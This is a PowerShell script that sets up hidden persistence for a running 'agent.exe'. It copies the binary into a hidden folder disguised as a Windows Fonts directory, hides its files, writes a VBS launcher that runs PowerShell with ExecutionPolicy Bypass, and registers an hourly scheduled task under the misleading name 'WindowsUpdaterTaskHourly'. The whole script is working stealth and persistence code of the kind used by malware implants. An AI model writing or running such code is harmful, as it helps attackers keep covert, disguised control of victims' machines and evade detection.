$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'

# -------------------------------------------------------------------
# 1. Get the running agent.exe process
# -------------------------------------------------------------------
$proc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $proc) {
    Write-Output "ERROR: No running agent.exe found. Start your agent first."
    exit 1
}
$sourcePath = $proc.Path
Write-Host "[+] Found agent.exe (PID: $($proc.Id)) at: $sourcePath"

# -------------------------------------------------------------------
# 2. Copy agent to hidden fonts folder (without killing anything)
# -------------------------------------------------------------------
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Host "[+] Created hidden folder: $hideDir"
}

$agentFile = "$hideDir\agent.exe"
# Force copy – works even if source is running (file not locked exclusively)
Copy-Item -LiteralPath $sourcePath -Destination $agentFile -Force
attrib +h $agentFile
Write-Host "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"

# -------------------------------------------------------------------
# 3. Create run.ps1 – kills ALL agent processes, then starts fonts copy
# -------------------------------------------------------------------
$runPs1 = "$hideDir\run.ps1"
$ps1Content = @"
`$ProgressPreference = 'SilentlyContinue'
`$target = '$agentFile'

# Kill every agent.exe process
Get-Process -Name "agent" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "[+] Killing agent PID `$(`$_.Id)"
    Stop-Process -Id `$_.Id -Force
}
Start-Sleep -Seconds 1

# Start the fresh copy
Start-Process -WindowStyle Hidden -FilePath `$target
"@
Set-Content -Path $runPs1 -Value $ps1Content -Encoding ASCII -Force
attrib +h $runPs1
Write-Host "[+] Created $runPs1"

# -------------------------------------------------------------------
# 4. Create run.vbs (silent launcher for run.ps1)
# -------------------------------------------------------------------
$runVbs = "$hideDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$runPs1""", 0, False
"@
Set-Content -Path $runVbs -Value $vbsContent -Encoding ASCII -Force
attrib +h $runVbs
Write-Host "[+] Created $runVbs"

# -------------------------------------------------------------------
# 5. Create/overwrite scheduled task (every 1 hour)
# -------------------------------------------------------------------
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$runVbs`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] Scheduled task '$taskName' created (runs every hour)"
} else {
    Write-Output "ERROR: Task creation failed with exit code $LASTEXITCODE"
    exit 1
}

# -------------------------------------------------------------------
# 6. Run run.ps1 now to replace the old agent
# -------------------------------------------------------------------
Write-Host "`n[*] Launching run.ps1 to replace running agent..."
powershell.exe -NoProfile -ExecutionPolicy Bypass -File $runPs1

Write-Host "`n✅ PERSISTENCE COMPLETE"
Write-Host "Agent now runs from: $agentFile (hidden)"
Write-Host "Scheduled task '$taskName' will re-launch every hour."
